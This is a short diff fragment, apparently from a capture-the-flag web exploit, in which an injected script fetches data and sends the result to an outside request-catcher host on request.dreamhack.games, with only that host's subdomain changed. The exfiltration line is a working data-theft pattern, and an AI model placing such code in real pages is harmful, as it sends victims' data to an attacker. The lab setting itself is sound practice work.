@@ -28,7 +28,7 @@ app.get('/info', (req, res) => {
         })
         .then(response => response.json())
         .then(data => {
-            fetch("https://stnwewc.request.dreamhack.games/"+data.data)
+            fetch("https://xibbihb.request.dreamhack.games/"+data.data)
             console.log(data.data)
         })
         '>
